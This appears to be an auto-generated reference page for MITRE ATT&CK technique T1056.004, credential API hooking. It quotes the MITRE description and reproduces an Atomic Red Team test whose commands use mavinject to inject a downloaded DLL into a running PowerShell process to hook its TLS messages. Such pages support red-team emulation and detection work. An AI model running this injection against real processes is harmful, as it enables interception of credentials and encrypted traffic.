
# Credential API Hooking

## Description

### MITRE Description

> Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001),  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:

* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Endgame Process Injection July 2017)
* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.(Citation: Endgame Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)
* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Endgame Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)


## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator', 'SYSTEM']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1056/004

## Potential Commands

```
mavinject $pid /INJECTRUNNING PathToAtomicsFolder\T1056.004\bin\T1056.004x64.dll
curl #{server_name}
mavinject $pid /INJECTRUNNING #{file_name}
curl https://www.example.com
```

## Commands Dataset

```
[{'command': 'mavinject $pid /INJECTRUNNING '
             'PathToAtomicsFolder\\T1056.004\\bin\\T1056.004x64.dll\n'
             'curl #{server_name}\n',
  'name': None,
  'source': 'atomics/T1056.004/T1056.004.yaml'},
 {'command': 'mavinject $pid /INJECTRUNNING #{file_name}\n'
             'curl https://www.example.com\n',
  'name': None,
  'source': 'atomics/T1056.004/T1056.004.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Input Capture: Credential API Hooking': {'atomic_tests': [{'auto_generated_guid': 'de1934ea-1fbf-425b-8795-65fb27dd7e33',
                                                                                     'dependencies': [{'description': 'T1056.004x64.dll '
                                                                                                                      'must '
                                                                                                                      'exist '
                                                                                                                      'on '
                                                                                                                      'disk '
                                                                                                                      'at '
                                                                                                                      'specified '
                                                                                                                      'location '
                                                                                                                      '(#{file_name})\n',
                                                                                                       'get_prereq_command': 'New-Item '
                                                                                                                             '-Type '
                                                                                                                             'Directory '
                                                                                                                             '(split-path '
                                                                                                                             '#{file_name}) '
                                                                                                                             '-ErrorAction '
                                                                                                                             'ignore '
                                                                                                                             '| '
                                                                                                                             'Out-Null\n'
                                                                                                                             'Invoke-WebRequest '
                                                                                                                             '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" '
                                                                                                                             '-OutFile '
                                                                                                                             '"#{file_name}"\n',
                                                                                                       'prereq_command': 'if '
                                                                                                                         '(Test-Path '
                                                                                                                         '#{file_name}) '
                                                                                                                         '{exit '
                                                                                                                         '0} '
                                                                                                                         'else '
                                                                                                                         '{exit '
                                                                                                                         '1}\n'}],
                                                                                     'dependency_executor_name': 'powershell',
                                                                                     'description': 'Hooks '
                                                                                                    'functions '
                                                                                                    'in '
                                                                                                    'PowerShell '
                                                                                                    'to '
                                                                                                    'read '
                                                                                                    'TLS '
                                                                                                    'Communications\n',
                                                                                     'executor': {'command': 'mavinject '
                                                                                                             '$pid '
                                                                                                             '/INJECTRUNNING '
                                                                                                             '#{file_name}\n'
                                                                                                             'curl '
                                                                                                             '#{server_name}\n',
                                                                                                  'elevation_required': True,
                                                                                                  'name': 'powershell'},
                                                                                     'input_arguments': {'file_name': {'default': 'PathToAtomicsFolder\\T1056.004\\bin\\T1056.004x64.dll',
                                                                                                                       'description': 'Dll '
                                                                                                                                      'To '
                                                                                                                                      'Inject',
                                                                                                                       'type': 'Path'},
                                                                                                         'server_name': {'default': 'https://www.example.com',
                                                                                                                         'description': 'TLS '
                                                                                                                                        'Server '
                                                                                                                                        'To '
                                                                                                                                        'Test '
                                                                                                                                        'Get '
                                                                                                                                        'Request',
                                                                                                                         'type': 'Url'}},
                                                                                     'name': 'Hook '
                                                                                             'PowerShell '
                                                                                             'TLS '
                                                                                             'Encrypt/Decrypt '
                                                                                             'Messages',
                                                                                     'supported_platforms': ['windows']}],
                                                                   'attack_technique': 'T1056.004',
                                                                   'display_name': 'Input '
                                                                                   'Capture: '
                                                                                   'Credential '
                                                                                   'API '
                                                                                   'Hooking'}}]
```

# Tactics


* [Collection](../tactics/Collection.md)

* [Credential Access](../tactics/Credential-Access.md)
    

# Mitigations

None

# Actors


* [PLATINUM](../actors/PLATINUM.md)

